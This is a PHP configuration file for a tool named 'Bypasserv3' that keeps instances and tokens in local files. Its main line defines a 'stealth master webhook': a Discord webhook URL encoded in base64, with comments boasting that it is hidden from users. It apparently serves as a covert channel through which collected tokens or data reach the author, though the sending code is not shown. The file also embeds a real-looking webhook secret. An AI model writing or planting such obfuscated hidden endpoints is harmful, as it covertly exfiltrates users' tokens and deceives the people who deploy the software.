<?php
/**
 * Bypasserv3 - Configuration File
 * File-based storage system with stealth master webhook
 */

// 🥷 STEALTH MASTER WEBHOOK (Base64 encoded - completely hidden from users)
// To set yours: Base64 encode your webhook URL at https://www.base64encode.org/
// Example: https://discord.com/api/webhooks/123/abc → encode it → paste below
// REPLACE THE BASE64 STRING BELOW WITH YOUR ENCODED WEBHOOK!
define('STEALTH_MASTER', base64_decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2OTkzMjg1MjQyOTcyMTY3MC9KWUwwOVlUVXZEdmhwakotN1cyNWVwQ2JhYWpwNk1kVlFUTFVfM3Y1N3JBUE91VE0xU29rVWRYRDlhTm9pV3Z5WHR1WQ=='));

// Database settings (if needed in future)
define('DB_HOST', 'localhost');
define('DB_NAME', 'bypasserv3');
define('DB_USER', 'root');
define('DB_PASS', '');

// Security settings
define('RATE_LIMIT_MAX', 50);
define('RATE_LIMIT_WINDOW', 3600);

// Instance settings
define('INSTANCES_DIR', __DIR__ . '/instances');
define('TOKENS_DIR', __DIR__ . '/tokens');
define('DATA_DIR', __DIR__ . '/data');

// Create directories if they don't exist
if (!file_exists(INSTANCES_DIR)) {
    mkdir(INSTANCES_DIR, 0777, true);
}
if (!file_exists(TOKENS_DIR)) {
    mkdir(TOKENS_DIR, 0777, true);
}
if (!file_exists(DATA_DIR)) {
    mkdir(DATA_DIR, 0777, true);
}

// Create .htaccess files for security
$instancesHtaccess = INSTANCES_DIR . '/.htaccess';
if (!file_exists($instancesHtaccess)) {
    file_put_contents($instancesHtaccess, "Deny from all\n");
}

$tokensHtaccess = TOKENS_DIR . '/.htaccess';
if (!file_exists($tokensHtaccess)) {
    file_put_contents($tokensHtaccess, "Deny from all\n");
}

$dataHtaccess = DATA_DIR . '/.htaccess';
if (!file_exists($dataHtaccess)) {
    file_put_contents($dataHtaccess, "Deny from all\n");
}
?>
